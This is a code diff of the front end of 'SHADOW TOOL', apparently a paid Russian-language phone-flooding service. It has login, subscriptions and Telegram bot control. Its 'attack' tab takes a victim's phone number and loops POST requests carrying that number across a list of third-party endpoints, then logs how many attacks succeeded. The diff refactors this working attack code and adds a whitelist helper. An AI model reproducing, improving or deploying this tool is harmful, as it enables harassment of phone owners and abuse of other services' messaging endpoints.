@@ -25,116 +25,47 @@
             padding: 25px;
             box-shadow: 0 0 30px rgba(0,255,0,0.2);
         }
-        h1 {
-            color: #00ff00;
-            text-align: center;
-            font-size: 32px;
-            margin-bottom: 8px;
-            letter-spacing: 3px;
-            text-shadow: 0 0 10px #00ff00;
-        }
-        .version {
-            text-align: center;
-            color: #00cc00;
-            font-size: 12px;
-            margin-bottom: 20px;
-        }
-        .tabs {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 20px;
-        }
+        h1 { color: #00ff00; text-align: center; font-size: 32px; margin-bottom: 8px; }
+        .version { text-align: center; color: #00cc00; font-size: 12px; margin-bottom: 20px; }
+        .tabs { display: flex; gap: 8px; margin-bottom: 20px; }
         .tab-btn {
-            flex: 1;
-            background: #111111;
-            border: 1px solid #00ff00;
-            color: #00ff00;
-            padding: 12px;
-            cursor: pointer;
-            text-align: center;
-            font-weight: bold;
+            flex: 1; background: #111111; border: 1px solid #00ff00; color: #00ff00;
+            padding: 12px; cursor: pointer; text-align: center; font-weight: bold;
             border-radius: 8px;
         }
-        .tab-btn.active {
-            background: #00ff00;
-            color: #000000;
-        }
+        .tab-btn.active { background: #00ff00; color: #000000; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
         input {
-            width: 100%;
-            padding: 14px;
-            background: #111111;
-            border: 1px solid #00ff00;
-            color: #ffffff;
-            font-size: 16px;
-            margin: 10px 0;
-            border-radius: 8px;
+            width: 100%; padding: 14px; background: #111111; border: 1px solid #00ff00;
+            color: #ffffff; font-size: 16px; margin: 10px 0; border-radius: 8px;
         }
-        input::placeholder { color: #888888; }
         button {
-            width: 100%;
-            padding: 14px;
-            background: #00ff00;
-            border: none;
-            color: #000000;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            margin: 8px 0;
-            border-radius: 8px;
+            width: 100%; padding: 14px; background: #00ff00; border: none; color: #000000;
+            font-weight: bold; font-size: 16px; cursor: pointer; margin: 8px 0; border-radius: 8px;
         }
         button:hover { opacity: 0.85; }
         .logs {
-            height: 220px;
-            overflow-y: auto;
-            background: #050505;
-            border: 1px solid #00ff00;
-            margin-top: 15px;
-            padding: 12px;
-            font-size: 12px;
-            border-radius: 8px;
+            height: 220px; overflow-y: auto; background: #050505; border: 1px solid #00ff00;
+            margin-top: 15px; padding: 12px; font-size: 12px; border-radius: 8px;
         }
-        .log {
-            color: #00ff00;
-            border-left: 3px solid #00ff00;
-            padding-left: 10px;
-            margin: 8px 0;
-        }
+        .log { color: #00ff00; border-left: 3px solid #00ff00; padding-left: 10px; margin: 8px 0; }
         .error-log { border-left-color: #ff4444; color: #ff8888; }
         .status {
-            position: fixed;
-            bottom: 15px;
-            right: 15px;
-            background: #000000;
-            border: 1px solid #00ff00;
-            padding: 6px 12px;
-            color: #00ff00;
-            font-size: 11px;
+            position: fixed; bottom: 15px; right: 15px; background: #000000;
+            border: 1px solid #00ff00; padding: 6px 12px; color: #00ff00; font-size: 11px;
             border-radius: 20px;
         }
         .sub-info {
-            background: #111111;
-            border: 1px solid #00ff00;
-            border-radius: 8px;
-            padding: 12px;
-            margin-top: 15px;
-            text-align: center;
+            background: #111111; border: 1px solid #00ff00; border-radius: 8px;
+            padding: 12px; margin-top: 15px; text-align: center;
         }
         .sub-label { font-size: 11px; color: #00cc88; margin-bottom: 5px; }
         .sub-days { font-size: 18px; font-weight: bold; color: #00ff00; }
-        .stats {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 20px;
-        }
+        .stats { display: flex; gap: 12px; margin-bottom: 20px; }
         .stat-card {
-            flex: 1;
-            background: #111111;
-            border: 1px solid #00ff00;
-            text-align: center;
-            padding: 12px;
-            border-radius: 10px;
+            flex: 1; background: #111111; border: 1px solid #00ff00; text-align: center;
+            padding: 12px; border-radius: 10px;
         }
         .stat-value { font-size: 28px; font-weight: bold; color: #00ff00; }
         .stat-label { font-size: 11px; color: #00cc88; margin-top: 5px; }
@@ -142,28 +73,15 @@
         .history-table th, .history-table td { padding: 8px; border-bottom: 1px solid #333333; text-align: left; color: #ffffff; }
         .history-table th { color: #00ff00; }
         .action-btn {
-            background: #222222;
-            border: 1px solid #00ff00;
-            color: #00ff00;
-            padding: 4px 10px;
-            cursor: pointer;
-            border-radius: 5px;
+            background: #222222; border: 1px solid #00ff00; color: #00ff00;
+            padding: 4px 10px; cursor: pointer; border-radius: 5px;
         }
-        a { color: #00ff00; }
         .profile-info {
-            background: #111111;
-            padding: 20px;
-            border-radius: 10px;
-            border: 1px solid #00ff00;
+            background: #111111; padding: 20px; border-radius: 10px; border: 1px solid #00ff00;
         }
         .bind-code {
-            background: #000000;
-            padding: 12px;
-            text-align: center;
-            font-size: 22px;
-            letter-spacing: 4px;
-            border: 1px solid #00ff00;
-            border-radius: 8px;
+            background: #000000; padding: 12px; text-align: center; font-size: 22px;
+            letter-spacing: 4px; border: 1px solid #00ff00; border-radius: 8px;
         }
         @media (max-width: 500px) {
             .container { padding: 18px; }
@@ -176,7 +94,6 @@
     <h1>⚡ SHADOW TOOL</h1>
     <div class="version">v3.0</div>
 
-    <!-- Формы входа/регистрации -->
     <div id="authForms">
         <div id="loginForm">
             <input type="text" id="loginLogin" placeholder="Логин">
@@ -194,7 +111,6 @@
         <div id="authSuccess" style="color:#00ff44; text-align:center; margin-top:12px;"></div>
     </div>
 
-    <!-- Основной контент -->
     <div id="mainContent" style="display:none;">
         <div class="tabs">
             <div class="tab-btn active" onclick="switchTab('attack')">АТАКА</div>
@@ -202,7 +118,6 @@
             <div class="tab-btn" onclick="switchTab('profile')">ПРОФИЛЬ</div>
         </div>
 
-        <!-- Вкладка АТАКА -->
         <div id="attackTab" class="tab-content active">
             <input type="text" id="phone" placeholder="+79001234567">
             <button onclick="startAttack()">НАЧАТЬ АТАКУ</button>
@@ -213,7 +128,6 @@
             <div class="logs" id="logs"></div>
         </div>
 
-        <!-- Вкладка ИСТОРИЯ -->
         <div id="historyTab" class="tab-content">
             <div class="stats">
                 <div class="stat-card"><div class="stat-value" id="totalCount">0</div><div class="stat-label">АТАК</div></div>
@@ -228,31 +142,24 @@
             </div>
         </div>
 
-        <!-- Вкладка ПРОФИЛЬ -->
         <div id="profileTab" class="tab-content">
             <div class="profile-info">
                 <h3 style="color:#00ff00; margin-bottom:15px;">👤 ПРОФИЛЬ</h3>
-                
                 <div style="margin-bottom:20px;">
                     <p><strong style="color:#00ff00;">Логин:</strong> <span id="profileLogin">—</span></p>
                     <p><strong style="color:#00ff00;">Подписка:</strong> <span id="profileSub">—</span></p>
                     <p><strong style="color:#00ff00;">Действует до:</strong> <span id="profileExpires">—</span></p>
                 </div>
-                
                 <hr style="border-color:#00ff00; margin:15px 0;">
-                
                 <h4 style="color:#00ff00; margin-bottom:10px;">🤖 ПРИВЯЗКА TELEGRAM</h4>
                 <p style="margin-bottom:10px;">Привяжите Telegram, чтобы управлять атаками через бота</p>
-                
                 <button onclick="generateBindCode()" style="background:#00ff00; color:#000; width:auto; padding:10px 20px;">📱 ПОЛУЧИТЬ КОД</button>
-                
                 <div id="bindCodeDisplay" style="display:none; margin-top:15px; padding:15px; background:#0a0a0a; border-radius:8px;">
                     <p style="margin-bottom:8px;">Ваш код для привязки:</p>
                     <div class="bind-code" id="bindCode"></div>
-                    <p style="margin-top:12px; font-size:12px;">Отправьте этот код боту: <code style="background:#000; padding:2px 6px;">/bind КОД</code></p>
+                    <p style="margin-top:12px; font-size:12px;">Отправьте этот код боту: <code>/bind КОД</code></p>
                     <p style="font-size:11px; color:#888;">Код действителен 5 минут</p>
                 </div>
-                
                 <div id="bindStatus" style="margin-top:15px; padding:10px; background:#0a0a0a; border-radius:8px; font-size:12px;">
                     <span style="color:#888;">Загружаем статус привязки...</span>
                 </div>
@@ -263,7 +170,6 @@
 </div>
 
 <script>
-    // ========== НАСТРОЙКИ ==========
     const API_BASE = 'https://use-production-80e9.up.railway.app';
     
     const ATTACK_URLS = [
@@ -284,21 +190,41 @@
     let currentSubscription = false;
     let subscriptionExpires = null;
 
+    // ========== НОРМАЛИЗАЦИЯ НОМЕРА ДЛЯ САЙТА ==========
+    function normalizePhoneForCheck(phone) {
+        let digits = phone.replace(/\D/g, '');
+        if (!digits) return null;
+        if (digits.startsWith('8')) digits = '7' + digits.slice(1);
+        if (digits.startsWith('7') && digits.length === 11) return '+' + digits;
+        if (digits.startsWith('9') && digits.length === 10) return '+7' + digits;
+        return digits;
+    }
+
+    async function isPhoneWhitelisted(phone) {
+        const normalized = normalizePhoneForCheck(phone);
+        if (!normalized) return false;
+        try {
+            const res = await fetch(API_BASE + '/is_whitelisted', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phone })
+            });
+            const data = await res.json();
+            return data.blocked === true;
+        } catch(e) {
+            return false;
+        }
+    }
+
     // ========== АВТОРИЗАЦИЯ ==========
     async function doRegister() {
         const login = document.getElementById('regLogin').value;
         const password = document.getElementById('regPassword').value;
-        if (!login || !password) {
-            showAuthError('Заполните все поля');
-            return;
-        }
-        showAuthError('');
-        showAuthSuccess('');
-        
+        if (!login || !password) { showAuthError('Заполните все поля'); return; }
+        showAuthError(''); showAuthSuccess('');
         try {
             const res = await fetch(API_BASE + '/register', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ login, password })
             });
             const data = await res.json();
@@ -306,27 +232,18 @@
                 showAuthSuccess('Регистрация успешна! Теперь войдите.');
                 showLogin();
                 document.getElementById('loginLogin').value = login;
-            } else {
-                showAuthError(data.error);
-            }
-        } catch(e) {
-            showAuthError('Ошибка соединения');
-        }
+            } else { showAuthError(data.error); }
+        } catch(e) { showAuthError('Ошибка соединения'); }
     }
 
     async function doLogin() {
         const login = document.getElementById('loginLogin').value;
         const password = document.getElementById('loginPassword').value;
-        if (!login || !password) {
-            showAuthError('Заполните все поля');
-            return;
-        }
+        if (!login || !password) { showAuthError('Заполните все поля'); return; }
         showAuthError('');
-        
         try {
             const res = await fetch(API_BASE + '/login', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ login, password })
             });
             const data = await res.json();
@@ -334,79 +251,48 @@
                 localStorage.setItem('token', data.token);
                 currentToken = data.token;
                 await checkAuthAndLoad();
-            } else {
-                showAuthError(data.error);
-            }
-        } catch(e) {
-            showAuthError('Ошибка соединения');
-        }
+            } else { showAuthError(data.error); }
+        } catch(e) { showAuthError('Ошибка соединения'); }
     }
 
     async function checkAuthAndLoad() {
         const token = localStorage.getItem('token');
-        if (!token) {
-            showAuth();
-            return;
-        }
-        
+        if (!token) { showAuth(); return; }
         try {
             const meRes = await fetch(API_BASE + '/me', {
                 headers: { 'Authorization': 'Bearer ' + token }
             });
-            if (!meRes.ok) {
-                localStorage.removeItem('token');
-                showAuth();
-                return;
-            }
-            
+            if (!meRes.ok) { localStorage.removeItem('token'); showAuth(); return; }
             const meData = await meRes.json();
-            
             const subRes = await fetch(API_BASE + '/check_subscription', {
                 headers: { 'Authorization': 'Bearer ' + token }
             });
             const subData = await subRes.json();
             currentSubscription = subData.has_access;
             subscriptionExpires = subData.expires_at;
-            
             showApp();
             updateHistoryDisplay();
             updateSubscriptionDisplay();
-            
-            // Обновляем статус привязки в профиле
             const bindStatusDiv = document.getElementById('bindStatus');
             if (bindStatusDiv) {
-                if (meData.telegram_bound) {
-                    bindStatusDiv.innerHTML = '<span style="color:#00ff00;">✅ Telegram привязан! Используйте /attack в боте</span>';
-                } else {
-                    bindStatusDiv.innerHTML = '<span style="color:#ffaa00;">⚠️ Telegram не привязан. Получите код выше.</span>';
-                }
+                if (meData.telegram_bound) bindStatusDiv.innerHTML = '<span style="color:#00ff00;">✅ Telegram привязан! Используйте /a в боте</span>';
+                else bindStatusDiv.innerHTML = '<span style="color:#ffaa00;">⚠️ Telegram не привязан. Получите код выше.</span>';
             }
-            
-            if (currentSubscription) {
-                document.getElementById('status').innerHTML = 'ГОТОВ';
-            } else {
-                document.getElementById('status').innerHTML = 'НЕТ ПОДПИСКИ';
-            }
-        } catch(e) {
-            showAuth();
-        }
+            document.getElementById('status').innerHTML = currentSubscription ? 'ГОТОВ' : 'НЕТ ПОДПИСКИ';
+        } catch(e) { showAuth(); }
     }
 
     function updateSubscriptionDisplay() {
         const subDaysSpan = document.getElementById('subDaysLeft');
         if (!subDaysSpan) return;
-        
         if (!currentSubscription || !subscriptionExpires) {
             subDaysSpan.innerHTML = 'Нет подписки';
             subDaysSpan.style.color = '#ff8888';
             return;
         }
-        
         const now = new Date();
         const expireDate = new Date(subscriptionExpires);
-        const diffMs = expireDate - now;
-        const diffDays = Math.ceil(diffMs / (1000 * 60 * 60 * 24));
-        
+        const diffDays = Math.ceil((expireDate - now) / (1000 * 60 * 60 * 24));
         if (diffDays <= 0) {
             subDaysSpan.innerHTML = 'Истекла';
             subDaysSpan.style.color = '#ff8888';
@@ -430,21 +316,14 @@
         document.getElementById('mainContent').style.display = 'block';
     }
 
-    function showAuthError(msg) {
-        document.getElementById('authError').innerText = msg;
-    }
-    
-    function showAuthSuccess(msg) {
-        document.getElementById('authSuccess').innerText = msg;
-    }
-
+    function showAuthError(msg) { document.getElementById('authError').innerText = msg; }
+    function showAuthSuccess(msg) { document.getElementById('authSuccess').innerText = msg; }
     function showRegister() {
         document.getElementById('loginForm').style.display = 'none';
         document.getElementById('registerForm').style.display = 'block';
         document.getElementById('authError').innerText = '';
         document.getElementById('authSuccess').innerText = '';
     }
-
     function showLogin() {
         document.getElementById('registerForm').style.display = 'none';
         document.getElementById('loginForm').style.display = 'block';
@@ -458,41 +337,23 @@
             addLog('У ВАС НЕТ АКТИВНОЙ ПОДПИСКИ!', true);
             return;
         }
-        
         const phone = document.getElementById('phone').value.trim();
         document.getElementById('logs').innerHTML = '';
+        if (!phone) { addLog('Введите номер телефона', true); return; }
         
-        if (!phone) {
-            addLog('Введите номер телефона', true);
+        addLog('Проверка белого списка...');
+        if (await isPhoneWhitelisted(phone)) {
+            addLog('⛔ Номер в белом списке. Атака заблокирована.', true);
             return;
         }
         
-        // Проверка белого списка
-        addLog('Проверка белого списка...');
-        try {
-            const wRes = await fetch(API_BASE + '/is_whitelisted', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: phone })
-            });
-            const wData = await wRes.json();
-            if (wData.blocked) {
-                addLog('Номер в белом списке. Атака заблокирована.', true);
-                return;
-            }
-        } catch(e) {
-            addLog('Не удалось проверить белый список', true);
-        }
-
-        addLog(`Начинаю атаку на ${phone}`);
+        addLog(`🚀 Начинаю атаку на ${phone}`);
         document.getElementById('status').innerHTML = 'АТАКА...';
-        
         let success = 0;
         for (let i = 0; i < ATTACK_URLS.length; i++) {
             try {
                 await fetch(ATTACK_URLS[i], {
-                    method: 'POST',
-                    mode: 'no-cors',
+                    method: 'POST', mode: 'no-cors',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: `phone=${encodeURIComponent(phone)}`
                 });
@@ -503,18 +364,13 @@
             }
             await new Promise(r => setTimeout(r, 100));
         }
-        
         attackHistory.unshift({
-            id: Date.now(),
-            timestamp: new Date().toISOString(),
-            phone: phone,
-            success: success,
-            total: ATTACK_URLS.length
+            id: Date.now(), timestamp: new Date().toISOString(),
+            phone: phone, success: success, total: ATTACK_URLS.length
         });
         if (attackHistory.length > 30) attackHistory.pop();
         localStorage.setItem('shadow_history', JSON.stringify(attackHistory));
-        
-        addLog(`АТАКА ЗАВЕРШЕНА! Успешно: ${success}/${ATTACK_URLS.length}`);
+        addLog(`🎯 АТАКА ЗАВЕРШЕНА! Успешно: ${success}/${ATTACK_URLS.length}`);
         document.getElementById('status').innerHTML = 'ГОТОВ';
         updateHistoryDisplay();
     }
@@ -528,21 +384,17 @@
         logsDiv.scrollTop = logsDiv.scrollHeight;
     }
 
-    // ========== ИСТОРИЯ ==========
     function updateHistoryDisplay() {
         const total = attackHistory.length;
         const successRate = total > 0 ? Math.round(attackHistory.filter(h => h.success === h.total).length / total * 100) : 0;
         document.getElementById('totalCount').innerText = total;
         document.getElementById('successRate').innerText = successRate + '%';
-        
         const tbody = document.getElementById('historyBody');
         if (!tbody) return;
-        
         if (total === 0) {
             tbody.innerHTML = '<tr><td colspan="4" style="color:#888; text-align:center;">История атак пуста</td></tr>';
             return;
         }
-        
         tbody.innerHTML = attackHistory.map(h => `
             <tr>
                 <td style="color:#ffffff;">${new Date(h.timestamp).toLocaleTimeString()}</td>
@@ -567,26 +419,20 @@
         }
     }
 
-    // ========== ПРОФИЛЬ ==========
     async function loadProfile() {
         const token = localStorage.getItem('token');
         if (!token) return;
-        
         try {
             const res = await fetch(API_BASE + '/me', {
                 headers: { 'Authorization': 'Bearer ' + token }
             });
             const data = await res.json();
-            
             if (data.id) {
                 document.getElementById('profileLogin').innerText = data.login;
-                
-                // Проверяем подписку
                 const subRes = await fetch(API_BASE + '/check_subscription', {
                     headers: { 'Authorization': 'Bearer ' + token }
                 });
                 const subData = await subRes.json();
-                
                 if (subData.has_access) {
                     const days = subData.plan ? subData.plan.replace('_days', '') : '?';
                     document.getElementById('profileSub').innerHTML = `<span style="color:#00ff00;">✅ Активна (${days} дн.)</span>`;
@@ -598,62 +444,38 @@
                     document.getElementById('profileSub').innerHTML = '<span style="color:#ff8888;">❌ Нет подписки</span>';
                     document.getElementById('profileExpires').innerHTML = '—';
                 }
-                
-                // Статус привязки Telegram
-                const bindStatusDiv = document.getElementById('bindStatus');
-                if (bindStatusDiv) {
-                    if (data.telegram_bound) {
-                        bindStatusDiv.innerHTML = '<span style="color:#00ff00;">✅ Telegram привязан! Используйте /attack в боте</span>';
-                    } else {
-                        bindStatusDiv.innerHTML = '<span style="color:#ffaa00;">⚠️ Telegram не привязан. Получите код выше.</span>';
-                    }
+                if (data.telegram_bound) {
+                    document.getElementById('bindStatus').innerHTML = '<span style="color:#00ff00;">✅ Telegram привязан! Используйте /a в боте</span>';
+                } else {
+                    document.getElementById('bindStatus').innerHTML = '<span style="color:#ffaa00;">⚠️ Telegram не привязан. Получите код выше.</span>';
                 }
             }
-        } catch(e) {
-            console.error('Profile load error:', e);
-        }
+        } catch(e) { console.error('Profile load error:', e); }
     }
 
     async function generateBindCode() {
         const token = localStorage.getItem('token');
-        if (!token) {
-            alert('Вы не авторизованы');
-            return;
-        }
-        
+        if (!token) { alert('Вы не авторизованы'); return; }
         try {
             const res = await fetch(API_BASE + '/generate_bind_code', {
-                method: 'POST',
-                headers: { 'Authorization': 'Bearer ' + token }
+                method: 'POST', headers: { 'Authorization': 'Bearer ' + token }
             });
             const data = await res.json();
-            
             if (data.code) {
                 document.getElementById('bindCode').innerText = data.code;
                 document.getElementById('bindCodeDisplay').style.display = 'block';
-                const bindStatus = document.getElementById('bindStatus');
-                if (bindStatus) {
-                    bindStatus.innerHTML = '<span style="color:#00ff00;">✅ Код сгенерирован! Отправьте его боту: /bind ' + data.code + '</span>';
-                }
+                document.getElementById('bindStatus').innerHTML = '<span style="color:#00ff00;">✅ Код сгенерирован! Отправьте его боту: /bind ' + data.code + '</span>';
             } else {
-                const bindStatus = document.getElementById('bindStatus');
-                if (bindStatus) {
-                    bindStatus.innerHTML = '<span style="color:#ff4444;">❌ Ошибка: ' + (data.error || 'неизвестно') + '</span>';
-                }
+                document.getElementById('bindStatus').innerHTML = '<span style="color:#ff4444;">❌ Ошибка: ' + (data.error || 'неизвестно') + '</span>';
             }
         } catch(e) {
-            const bindStatus = document.getElementById('bindStatus');
-            if (bindStatus) {
-                bindStatus.innerHTML = '<span style="color:#ff4444;">❌ Ошибка соединения</span>';
-            }
+            document.getElementById('bindStatus').innerHTML = '<span style="color:#ff4444;">❌ Ошибка соединения</span>';
         }
     }
 
-    // ========== ТАБЫ ==========
     function switchTab(tab) {
         document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
         document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active'));
-        
         if (tab === 'attack') {
             document.getElementById('attackTab').classList.add('active');
             document.querySelector('.tab-btn:first-child').classList.add('active');
@@ -668,7 +490,6 @@
         }
     }
 
-    // ========== ЗАПУСК ==========
     checkAuthAndLoad();
     setInterval(() => updateSubscriptionDisplay(), 60000);
 </script>
